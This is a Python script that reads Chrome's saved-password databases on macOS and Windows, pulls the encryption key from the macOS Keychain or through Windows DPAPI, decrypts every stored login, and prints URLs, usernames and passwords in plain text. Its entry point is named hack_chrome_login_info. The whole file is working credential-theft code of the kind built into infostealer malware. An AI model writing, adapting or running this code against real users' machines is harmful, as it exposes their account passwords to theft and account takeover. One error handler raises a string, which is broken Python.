import base64
import hashlib
import json
import platform
import shutil
import sqlite3
import subprocess
import tempfile
from dataclasses import dataclass
from pathlib import Path

from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad


@dataclass
class LoginInfo:
    url: str
    username: str
    password: str


def get_login_data_paths() -> list[Path]:
    """
    Locate Chrome's Login Data database files across different profiles for macOS and Windows.
    Returns:
        A list of paths to Login Data database files.
    """

    paths = []
    if platform.system() == "Darwin":
        base_dir = Path("~/Library/Application Support/Google/Chrome").expanduser()
        return list(base_dir.glob("*/Login Data"))

    elif platform.system() == "Windows":  # Windows
        base_dir = Path.home() / "AppData/Local/Google/Chrome/User Data"
        return list(base_dir.glob("Profile*/Login Data")) + [
            base_dir / "Default/Login Data"
        ]
    else:
        raise EnvironmentError("Unsupported operating system.")


def fetch_safe_storage_key(service_name: str = "Chrome") -> bytes:
    """
    Retrieve the Chrome Safe Storage Key from the macOS Keychain or Windows DPAPI.
    Args:
        service_name (str): The service name in Keychain (e.g., 'Chrome').
    Returns:
        The Safe Storage Key as a string.
    """

    if platform.system() == "Darwin":  # macOS
        try:
            cmd = f"security find-generic-password -ga '{service_name}' 2>&1 | awk '/password:/ {{print $2}}'"
            raw_output = subprocess.check_output(cmd, shell=True, text=True).strip()
            return raw_output.strip('"').encode()
        except subprocess.CalledProcessError as e:
            raise RuntimeError(f"Failed to retrieve Safe Storage Key: {e}")
    elif platform.system() == "Windows":  # Windows
        try:
            local_state_path = (
                Path.home() / "AppData/Local/Google/Chrome/User Data/Local State"
            )
            with open(local_state_path, "r", encoding="utf-8") as file:
                local_state = json.load(file)
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[
                5:
            ]  # Remove DPAPI prefix
            return encrypted_key
        except Exception as e:
            raise RuntimeError(f"Failed to retrieve Safe Storage Key: {e}")
    else:
        raise EnvironmentError("Unsupported operating system.")


def chrome_decrypt(encrypted_value: bytes, key_16: bytes) -> str:
    """
    Decrypt an encrypted password using AES-128-CBC (macOS) or AES-128-GCM (Windows).
    Args:
        encrypted_value (bytes): The encrypted value from Chrome's database.
        key_16 (bytes): The 16-byte key derived from PBKDF2.
    Returns:
        The decrypted password as a string.
    """

    try:
        if platform.system() == "Darwin":
            # macOS (AES-128-CBC with a fixed IV of 16 bytes)
            # Remove the 'v10' prefix
            enc_pass = encrypted_value[3:]
            # Chrome uses a fixed IV of 16 bytes filled with 0x20 (space)
            iv = b"\x20" * 16
            # Perform AES decryption
            cipher = AES.new(key_16, AES.MODE_CBC, iv)
            return unpad(cipher.decrypt(enc_pass), AES.block_size).decode(
                "utf-8", errors="replace"
            )
        elif platform.system() == "Windows":  # Assume Windows (AES-128-GCM)
            enc_pass = encrypted_value[15:-16]
            iv = encrypted_value[3:15]
            cipher = AES.new(key_16, AES.MODE_GCM, iv)
            return cipher.decrypt(enc_pass).decode()
    except Exception as e:
        raise f"[Decryption Error: {str(e)}]"


def process_login_data(
    login_data_path: Path, safe_storage_key: bytes
) -> list[LoginInfo]:
    """
    Process a single Login Data database to decrypt stored credentials.
    Args:
        login_data_path (Path): Path to the Login Data database.
        safe_storage_key (bytes): Chrome Safe Storage Key from macOS Keychain or Windows DPAPI.
    Returns:
        A list of LoginInfo objects.
    """
    if platform.system() == "Darwin":
        key = hashlib.pbkdf2_hmac("sha1", safe_storage_key, b"saltysalt", 1003)[:16]
    elif platform.system() == "Windows":
        import win32crypt

        key = win32crypt.CryptUnprotectData(safe_storage_key, None, None, None, 0)[1]
    else:
        raise EnvironmentError("Unsupported operating system.")

    credentials = []
    with tempfile.TemporaryDirectory() as temp_dir:
        temp_file = Path(temp_dir) / login_data_path.name
        shutil.copy(login_data_path, temp_file)
        try:
            conn = sqlite3.connect(temp_file)
            cursor = conn.cursor()
            cursor.execute(
                "SELECT origin_url, username_value, password_value FROM logins"
            )

            for url, username, encrypted_password in cursor.fetchall():
                if not username or not encrypted_password.startswith(b"v10"):
                    continue
                password = chrome_decrypt(encrypted_password, key)
                if password:
                    credentials.append(LoginInfo(url or "[No URL]", username, password))

        finally:
            conn.close()
    return credentials


def beauty_print_chrome(login_list: list[LoginInfo]) -> None:
    if not login_list:
        print("No login information available.")
        return

    print("=" * 50)
    print("Login Credentials")
    print("=" * 50)

    for i, info in enumerate(login_list, start=1):
        print(f"[{i}]")
        print(f"  URL:      {info.url}")
        print(f"  Username: {info.username}")
        print(f"  Password: {info.password}")
        print("-" * 50)

    print("End of List")
    print("=" * 50)


def hack_chrome_login_info() -> list[LoginInfo]:
    login_data_paths = get_login_data_paths()
    safe_storage_key = fetch_safe_storage_key("Chrome")

    credentials: list[LoginInfo] = []
    for login_data_path in login_data_paths:
        credentials.extend(process_login_data(login_data_path, safe_storage_key))
    return credentials


if __name__ == "__main__":
    infos = hack_chrome_login_info()
    beauty_print_chrome(infos)
